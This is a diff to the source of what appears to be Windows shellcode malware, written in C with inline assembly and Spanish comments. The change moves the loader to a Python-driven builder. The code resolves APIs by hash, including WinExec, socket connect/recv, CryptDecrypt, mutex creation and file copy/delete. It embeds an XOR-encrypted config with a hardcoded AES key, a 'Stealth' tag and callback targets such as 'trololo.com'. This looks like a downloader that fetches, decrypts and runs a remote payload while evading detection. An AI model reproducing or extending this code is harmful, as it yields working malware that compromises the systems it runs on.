@@ -5,7 +5,13 @@
 **    Para más información sobre éstas revisar 'macros.h'.
 **    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
 *###############################################################################*/
+#include "macros.h"
+INCLUDE_PYSRC(..\..\builder\intrabuilder.py)
 
+#define API_DEFINE(...) PYTHON_FUNCTION()
+#define VAR_DEFINE(...) PYTHON_FUNCTION()
+#define STACKSIZE(...) PYTHON_FUNCTION()
+#define MY_CONFIG(...) PYTHON_FUNCTION()
 //No queremos que muestre el warning de etiqueta sin referencia, 
 //ya que las usamos para mejorar la legibilidad del código
 #pragma warning(disable:4102)
@@ -17,7 +23,26 @@
 
 #include <Windows.h>
 #include <stdio.h>
-#include "macros.h"
+
+DEFINE_PYSRC(
+def MY_CONFIG():
+    blob = aes128Blob(bType    = PLAINTEXTKEYBLOB,
+                      bVersion = CUR_BLOB_VERSION,
+                      wReserved= 0x0000,
+                      aiKeyAlg = CALG_AES_128,
+                      keySize  = 0x00000010,
+                      keyData  = [0x63, 0x08, 0x5B, 0x66, 0xDB, 0xD6, 0x33, 0x31, 0xF3, 0x80, 0xD9, 0x75, 0x59, 0xEC, 0x38, 0x04])
+
+    b = Builder()
+    b.addBlob(blob)
+    b.addString("Stealth")
+    b.addTargets([[0x932B, "trololo.com"], [0x932B, "127.0.0.1"]])
+    b.addDword(0)
+    b.addDword(0)
+    b.padd()
+    b.XorCrypt()
+    return EMIT_ARRAY(b.result())
+)DEFINE_END()
 
 #ifndef DEBUG
 #pragma comment(linker, "/NODEFAULTLIB")
@@ -83,55 +108,55 @@ find_delta:
 #pragma region hashes
 kernel32_symbol_hashes:
         #define kernel32_count  14
-        API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
-        API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s'))
-        API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p'))
-        API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
-        API_DEFINE(LocalAlloc, ('L') ('o') ('c') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
-        API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
-        API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A'))
-        API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A'))
-        API_DEFINE(CopyFileA, ('C') ('o') ('p') ('y') ('F') ('i') ('l') ('e') ('A'))
-        API_DEFINE(DeleteFileW, ('D') ('e') ('l') ('e') ('t') ('e') ('F') ('i') ('l') ('e') ('W'))
-        API_DEFINE(WinExec, ('W') ('i') ('n') ('E') ('x') ('e') ('c'))
-        API_DEFINE(CreateFileA, ('C') ('r') ('e') ('a') ('t') ('e') ('F') ('i') ('l') ('e') ('A'))
-        API_DEFINE(ReadFile, ('R') ('e') ('a') ('d') ('F') ('i') ('l') ('e'))
-        API_DEFINE(SetFilePointer, ('S') ('e') ('t') ('F') ('i') ('l') ('e') ('P') ('o') ('i') ('n') ('t') ('e') ('r'))
+        API_DEFINE("LoadLibraryA")
+        API_DEFINE("GetProcAddress")
+        API_DEFINE("Sleep")
+        API_DEFINE("ExitProcess")
+        API_DEFINE("LocalAlloc")
+        API_DEFINE("VirtualAlloc")
+        API_DEFINE("CreateMutexA")
+        API_DEFINE("GetTempFileNameA")
+        API_DEFINE("CopyFileA")
+        API_DEFINE("DeleteFileW")
+        API_DEFINE("WinExec")
+        API_DEFINE("CreateFileA")
+        API_DEFINE("ReadFile")
+        API_DEFINE("SetFilePointer")
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    7
-        API_DEFINE(WSASocketA, ('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A'))
-        API_DEFINE(connect, ('c') ('o') ('n') ('n') ('e') ('c') ('t'))
-        API_DEFINE(WSAStartup, ('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p'))
-        API_DEFINE(closesocket, ('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t'))
-        API_DEFINE(inet_addr, ('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r'))
-        API_DEFINE(gethostbyname, ('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e'))
-        API_DEFINE(recv, ('r') ('e') ('c') ('v'))
+        API_DEFINE("WSASocketA")
+        API_DEFINE("connect")
+        API_DEFINE("WSAStartup")
+        API_DEFINE("closesocket")
+        API_DEFINE("inet_addr")
+        API_DEFINE("gethostbyname")
+        API_DEFINE("recv")
 
 advapi32_symbol_hashes:
         #define advapi32_count	4
-        API_DEFINE(CryptAcquireContextA, ('C') ('r') ('y') ('p') ('t') ('A') ('c') ('q') ('u') ('i') ('r') ('e') ('C') ('o') ('n') ('t') ('e') ('x') ('t') ('A'))
-        API_DEFINE(CryptSetKeyParam, ('C') ('r') ('y') ('p') ('t') ('S') ('e') ('t') ('K') ('e') ('y') ('P') ('a') ('r') ('a') ('m'))
-        API_DEFINE(CryptImportKey, ('C') ('r') ('y') ('p') ('t') ('I') ('m') ('p') ('o') ('r') ('t') ('K') ('e') ('y'))
-        API_DEFINE(CryptDecrypt, ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t'))
+        API_DEFINE("CryptAcquireContextA")
+        API_DEFINE("CryptSetKeyParam")
+        API_DEFINE("CryptImportKey")
+        API_DEFINE("CryptDecrypt")
 #pragma endregion
 
 #pragma region VARS
-        VAR_DEFINE(CommandLine)
-        VAR_DEFINE(APPDATA)
-        VAR_DEFINE(DAT_NFO)
-        VAR_DEFINE(pHOST)
-        VAR_DEFINE(pKEY)
-        VAR_DEFINE(pMUTEX)
-        VAR_DEFINE(hProv)
-        VAR_DEFINE(hKey)
-        VAR_DEFINE(hSocket)
-        VAR_DEFINE(pBuff)
-        VAR_DEFINE(buffLen)
-        VAR_DEFINE(TARGETS)
-        VAR_DEFINE(PORT)
+        VAR_DEFINE("CommandLine")
+        VAR_DEFINE("APPDATA")
+        VAR_DEFINE("DAT_NFO")
+        VAR_DEFINE("pHOST")
+        VAR_DEFINE("pKEY")
+        VAR_DEFINE("pMUTEX")
+        VAR_DEFINE("hProv")
+        VAR_DEFINE("hKey")
+        VAR_DEFINE("hSocket")
+        VAR_DEFINE("pBuff")
+        VAR_DEFINE("buffLen")
+        VAR_DEFINE("TARGETS")
+        VAR_DEFINE("PORT")
 #pragma endregion
-        CALC_STACKSIZE()
+
 //¡¡¡¡CONSTANTES TEMPORALES!!!!
     __asm{
         /*###############################################################################
@@ -231,7 +256,11 @@ HOST2:  EMIT_BYTE_ARRAY(('l') ('o') ('c') ('a') ('l') ('h') ('o') ('s') ('t')(0)
         EMIT_DWORD(0)
         EMIT_DWORD(0)
         */
-        EMIT_BYTE_ARRAY((0xA4)(0x7B)(0xCF)(0xD1)(0xF9)(0x71)(0x72)(0xB1)(0xBC)(0x79)(0xCF)(0xD1)(0x94)(0x1F)(0x29)(0xD7)(0x77)(0xAF)(0xFC)(0xE0)(0x4)(0x97)(0xAB)(0xC4)(0xF5)(0x95)(0xF7)(0xD5)(0xA4)(0x63)(0x17)(0xD0)(0xC0)(0xD)(0xA7)(0xD1)(0xDC)(0x84)(0x6)(0xC3)(0xC3)(0x15)(0xA0)(0xBD)(0x98)(0x39)(0x11)(0xDE)(0xC1)(0x79)(0xE4)(0x42)(0xC6)(0x25)(0x45)(0x9F)(0x9C)(0x57)(0xFF)(0xFF)(0xC6)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1)(0xF7)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1))
+
+        MY_CONFIG( )
+
+        //EMIT_BYTE_ARRAY((0xA4)(0x7B)(0xCF)(0xD1)(0xF9)(0x71)(0x72)(0xB1)(0xBC)(0x79)(0xCF)(0xD1)(0x94)(0x1F)(0x29)(0xD7)(0x77)(0xAF)(0xFC)(0xE0)(0x4)(0x97)(0xAB)(0xC4)(0xF5)(0x95)(0xF7)(0xD5)(0xA4)(0x63)(0x17)(0xD0)(0xC0)(0xD)(0xA7)(0xD1)(0xDC)(0x84)(0x6)(0xC3)(0xC3)(0x15)(0xA0)(0xBD)(0x98)(0x39)(0x11)(0xDE)(0xC1)(0x79)(0xE4)(0x42)(0xC6)(0x25)(0x45)(0x9F)(0x9C)(0x57)(0xFF)(0xFF)(0xC6)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1)(0xF7)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1))
+
 #define CONFIG_SIZE 128
 config_end:
 #pragma endregion
@@ -244,7 +273,7 @@ to_start:
         **    Utilizaremos durante todo el código EBP como puntero al inicio de este
         **    'stack de direcciones'
         *###############################################################################*/
-        add  esp, -(STACKSIZE)
+        add  esp, - STACKSIZE( )
         lea  ebp, [esp+STACK_OFFSET]
 #ifdef SC_DELTA
         push edi                        //Guardamos el Delta
